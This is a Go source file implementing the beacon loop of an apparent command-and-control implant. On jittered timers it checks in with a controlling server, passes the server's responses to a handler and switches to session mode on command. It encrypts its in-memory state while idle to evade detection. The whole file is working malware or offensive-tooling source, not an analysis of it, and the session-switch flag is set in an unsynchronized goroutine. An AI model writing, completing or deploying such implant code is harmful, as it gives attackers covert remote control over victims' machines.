package beaconhandler

import (
	"fmt"
	"net/http"
	"time"

	httpFuncs "src/Client/beacon/http"
	"src/Client/generic/config"
	"src/Client/generic/logger"
)

// Beacon is the main agent loop, responsible for periodic check-ins to the server.
func Beacon() (error, bool) {
	logger.Log("[Beacon] ========== BEACON LOOP INITIATED ==========")
	var switchSession bool
	config.ConfigMutex.RLock()
	if config.ID == "" {
		config.ConfigMutex.RUnlock()
		logger.Fatal("[Beacon] FATAL: Beacon cannot start with an empty agent ID.")
		return fmt.Errorf("agent ID is not set"), false
	}
	if config.Timer <= 0 {
		config.ConfigMutex.RUnlock()
		logger.Fatal(fmt.Sprintf("[Beacon] FATAL: Beacon cannot start with an invalid timer: %f", config.Timer))
		return fmt.Errorf("initial timer is invalid: %f", config.Timer), false
	}
	config.ConfigMutex.RUnlock()
	logger.Log("[Beacon] Initial validation complete - ID and Timer verified")

	for {
		logger.Log("[Beacon] ---------- NEW BEACON ITERATION ----------")

		// Decrypt state if encrypted (waking up from sleep)
		if config.IsStateEncrypted() {
			logger.Log("[Beacon] State is encrypted, decrypting before beacon operation")
			logger.Log("[Beacon] Calling DecryptConfigState...")
			if err := config.DecryptConfigState(); err != nil {
				logger.Error(fmt.Sprintf("[Beacon] CRITICAL: Failed to decrypt state: %v", err))
				return fmt.Errorf("failed to decrypt state: %w", err), false
			}
			logger.Log("[Beacon] State decrypted successfully, ready for beacon operation")
			logger.Log("[Beacon] Verifying decrypted state availability")
		} else {
			logger.Log("[Beacon] State is already decrypted, no decryption needed")
		}

		// Get a snapshot of the current config for this iteration.
		logger.Log("[Beacon] Acquiring config snapshot")
		config.ConfigMutex.RLock()
		timerForThisLoop := config.Timer
		jitterForThisLoop := config.Jitter
		config.ConfigMutex.RUnlock()
		logger.Log(fmt.Sprintf("[Beacon] Config snapshot - Timer: %f, Jitter: %f", timerForThisLoop, jitterForThisLoop))

		// Calculate the sleep time for this iteration.
		sleepDuration := calculateSleepTime(timerForThisLoop, jitterForThisLoop)
		logger.Log(fmt.Sprintf("[Beacon] Calculated sleep duration: %v", sleepDuration))

		// Perform the beacon check-in.
		beaconCheckURL := httpFuncs.GenerateBeaconURL()
		logger.Log("[Beacon] Beaconing to: " + beaconCheckURL)
		logger.Log("[Beacon] Sending GET request to server")
		responseCode, responseBody, _, err := httpFuncs.GetRequest(beaconCheckURL)

		// --- Handle GET Request Outcome ---
		if err != nil {
			logger.Error("[Beacon] Beacon GET request failed: " + err.Error())
			logger.Log(fmt.Sprintf("[Beacon] Attempting retry with %d attempts, delay %d seconds", 5, int(sleepDuration.Seconds())))
			if retryErr := httpFuncs.RetryRequest(beaconCheckURL, 5, int(sleepDuration.Seconds())); retryErr != nil {
				logger.Error("[Beacon] All beacon retries failed: " + retryErr.Error())
				return fmt.Errorf("all beacon retries failed for %s: %w", beaconCheckURL, retryErr), false
			}
			logger.Log("[Beacon] Beacon retry successful.")
		} else if responseCode == http.StatusOK {
			logger.Log(fmt.Sprintf("[Beacon] Beacon GET successful (HTTP %d). Handling response.", responseCode))
			logger.Log(fmt.Sprintf("[Beacon] Response body length: %d bytes", len(responseBody)))
			go func() {
				switchSession = HandleResponse(responseBody)
			}()
		} else {
			logger.Warn(fmt.Sprintf("[Beacon] Beacon received non-200 status: %d. No action taken.", responseCode))
		}

		if switchSession {
			logger.Log("[Beacon] Session switch requested by server")
			logger.Log("[Beacon] Encrypting state before session switch")
			logger.Log("[Beacon] Calling EncryptConfigState...")
			if err := config.EncryptConfigState(); err != nil {
				logger.Error(fmt.Sprintf("[Beacon] Failed to encrypt state before session switch: %v", err))
			} else {
				logger.Log("[Beacon] State encrypted successfully before session switch")
			}
			logger.Log("[Beacon] Switching to session mode")
			return nil, true
		}

		// Encrypt state before sleeping (idle time)
		logger.Log("[Beacon] Preparing to sleep - encrypting sensitive state")
		logger.Log("[Beacon] Calling EncryptConfigState before idle period...")
		if err := config.EncryptConfigState(); err != nil {
			logger.Error(fmt.Sprintf("[Beacon] Failed to encrypt state before sleep: %v", err))
			logger.Error("[Beacon] WARNING: Continuing with unencrypted state (security risk)")
		} else {
			logger.Log("[Beacon] State encrypted successfully, entering idle mode")
			logger.Log("[Beacon] All sensitive data cleared from memory")
		}

		logger.Log(fmt.Sprintf("[Beacon] Entering sleep for %v (state should be encrypted)", sleepDuration))
		time.Sleep(sleepDuration)
		logger.Log("[Beacon] Waking up from sleep, will decrypt state for next iteration")
	}
}
